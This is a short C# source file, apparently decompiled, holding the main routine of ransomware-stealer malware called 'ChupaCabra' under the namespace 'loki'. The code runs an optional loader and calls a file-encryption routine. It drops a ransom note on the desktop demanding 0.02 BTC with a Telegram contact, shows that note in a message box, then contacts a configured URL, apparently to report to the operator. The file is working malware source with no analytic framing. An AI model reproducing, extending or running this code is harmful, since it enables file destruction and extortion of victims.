using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using loki.ChupaCabra.teacher;
using loki.loki.Utilies;

namespace loki;

internal static class Program
{
	public static string dir = Path.GetTempPath() + "\\AX754VD.tmp";

	private static void Main()
	{
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		if (Settings.loader)
		{
			loader.load();
		}
		if (Settings.teacher)
		{
			Thread.Sleep(12000);
			RansomwareCrypt.start();
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt", "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with ChupaCabra:" + Settings.Stealer_version + "\nTo Decrypt: \n - Send 0.02 BTC to: " + Settings.bitcoin_keshel + "\n - Contact me Telegram: @industria_host\n\n Если ты из СНГ, то извини друг, билд открылся у Тебя по случайности", Encoding.UTF8);
			Thread.Sleep(2000);
			MessageBox.Show("IMPORTANT INFORMATION!!!!\nAll your files are encrypted with ChupaCabra: " + Settings.Stealer_version + "\nTo Decrypt: \n - Send 0.02 BTC to: " + Settings.bitcoin_keshel + "\n - Contact me Telegram: @industria_host\n\n Если ты из СНГ, то извини друг, билд открылся у Тебя по случайности");
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt");
			WebClient webClient = new WebClient();
			string uRL = Settings.URL;
			webClient.DownloadString(uRL);
		}
	}
}
